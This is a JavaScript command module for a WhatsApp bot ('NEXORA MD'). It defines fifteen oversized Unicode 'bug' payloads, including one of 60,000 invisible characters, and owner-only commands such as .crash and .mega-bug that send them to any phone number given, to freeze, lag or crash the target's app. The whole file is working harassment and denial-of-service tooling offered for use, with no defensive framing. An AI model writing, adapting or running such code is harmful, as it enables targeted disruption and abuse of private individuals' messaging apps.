const settings = require('../../settings');

// ═══════════════════════════════════════════════════════════════
// NEXORA MD - BUG PAYLOADS (HIGH RISK)
// ═══════════════════════════════════════════════════════════════
const v1 = "❑".repeat(30000);
const v2 = "҈".repeat(35000);
const v3 = "⁗".repeat(25000);
const v4 = "☵".repeat(20000);
const v5 = "░".repeat(45000);
const v6 = "ꦿ".repeat(32000);
const ghost = "‎".repeat(60000);

const bugList = {
  crash: { react: "🔥", payload: `NEXORA DESTRUCTION\n${v1}` },
  bin: { react: "👾", payload: `010101-EXPLOIT-BIN\n${v2}` },
  "ui-bug": { react: "⚠️", payload: `UI-FREEZE-ATTACK\n${v3}` },
  "total-freeze": { react: "🥶", payload: `SYSTEM-STOP\n${v4}` },
  "heavy-wa": { react: "💣", payload: `BOMB-DATA\n${v5}` },
  lag: { react: "⏳", payload: `LAG-SYSTEM-999\n${v1}${v2}` },
  "dark-web": { react: "💀", payload: `DARK-WEB-EXPLOIT\n${v4}${v5}` },
  "ram-kill": { react: "🌋", payload: `RAM-TERMINATOR\n${v2.repeat(2)}` },
  "cpu-heat": { react: "♨️", payload: `CPU-OVERLOAD\n${v3.repeat(3)}` },
  "ghost-bug": { react: "👻", payload: `GHOST-INVISIBLE\n${ghost}` },
  "payload-x": { react: "📡", payload: `PAYLOAD-DATA-XXX\n${v6}` },
  "kernel-error": { react: "☣️", payload: `KERNEL-PANIC-001\n${v1}${v4}` },
  "infinite-lag": { react: "🌀", payload: `INFINITE-LOOP-BUG\n${v2}${v6}` },
  "internal-bug": { react: "📂", payload: `INTERNAL-FILE-CORRUPT\n${v5.repeat(2)}` },
  "death-point": { react: "⚰️", payload: `NEXORA-DEATH-POINT\n${v1}${v3}${v5}` }
};

module.exports = {
  name: 'crash', // Main command
  aliases: [
    'bin', 'ui-bug', 'total-freeze', 'heavy-wa', 'lag', 'dark-web',
    'ram-kill', 'cpu-heat', 'ghost-bug', 'payload-x', 'kernel-error',
    'infinite-lag', 'internal-bug', 'death-point', 'mega-bug'
  ],
  category: 'owner',
  description: 'Send a heavy payload to a target number (High Risk of Ban)',
  usage: '.crash <number>',
  ownerOnly: true,
  react: '☣️',

  async execute(conn, mek, args, chatId, isOwner) {
    try {
      if (!isOwner) {
        await conn.sendMessage(chatId, { react: { text: '❌', key: mek.key } });
        return;
      }

      // Determine which command was actually triggered
      const rawText = mek.message?.conversation || mek.message?.extendedTextMessage?.text || '';
      const triggeredCommand = rawText.slice(settings.prefix.length).split(' ')[0].toLowerCase();

      if (!args[0]) {
        await conn.sendMessage(chatId, { react: { text: '❌', key: mek.key } });
        return conn.sendMessage(chatId, {
          text: `Usage: .${triggeredCommand} 2547xxxxxxxx\n\n${settings.footer}`
        }, { quoted: mek });
      }

      const targetNum = args[0].replace(/[^0-9]/g, '');
      if (!targetNum) {
        return conn.sendMessage(chatId, {
          text: `Invalid number format.\n\n${settings.footer}`
        }, { quoted: mek });
      }

      const targetJid = targetNum + '@s.whatsapp.net';

      // ═══ MEGA-BUG (Sends ALL viruses) ═══
      if (triggeredCommand === 'mega-bug') {
        await conn.sendMessage(chatId, { react: { text: '💀', key: mek.key } });
        await conn.sendMessage(chatId, {
          text: `ULTIMATE COMBO\n\nLaunching all 15 payloads to ${targetNum}...\n\n${settings.footer}`
        }, { quoted: mek });

        for (const [name, bug] of Object.entries(bugList)) {
          try {
            await conn.sendMessage(targetJid, { text: bug.payload });
            await new Promise(r => setTimeout(r, 800)); // Delay between attacks
          } catch (e) {
            console.log(`[BUG] Failed to send ${name} to ${targetNum}:`, e.message);
          }
        }

        await conn.sendMessage(chatId, {
          text: `MEGA-BUG COMPLETED\n\nTarget @${targetNum} has been hit with all 15 payloads.\n\n${settings.footer}`,
          mentions: [targetJid]
        }, { quoted: mek });

        await conn.sendMessage(chatId, { react: { text: '✅', key: mek.key } });
        return;
      }

      // ═══ SINGLE ATTACK ═══
      const bug = bugList[triggeredCommand];
      
      if (!bug) {
        return conn.sendMessage(chatId, {
          text: `Unknown bug type.\n\n${settings.footer}`
        }, { quoted: mek });
      }

      await conn.sendMessage(chatId, { react: { text: bug.react, key: mek.key } });
      await conn.sendMessage(chatId, {
        text: `Attacking ${targetNum} with ${triggeredCommand.toUpperCase()}...\n\n${settings.footer}`
      }, { quoted: mek });

      try {
        await conn.sendMessage(targetJid, { text: bug.payload });
        
        await conn.sendMessage(chatId, {
          text: `Attack Successful.\n\nTarget: ${targetNum}\nType: ${triggeredCommand}\n\n${settings.footer}`
        }, { quoted: mek });

        await conn.sendMessage(chatId, { react: { text: '✅', key: mek.key } });
      } catch (e) {
        await conn.sendMessage(chatId, { react: { text: '❌', key: mek.key } });
        await conn.sendMessage(chatId, {
          text: `Failed to send. The target may have blocked the bot.\n\n${settings.footer}`
        }, { quoted: mek });
      }

    } catch (error) {
      console.log('[BUG] Error:', error.message);
      try { await conn.sendMessage(chatId, { react: { text: '❌', key: mek.key } }); } catch (e) {}
    }
  }
};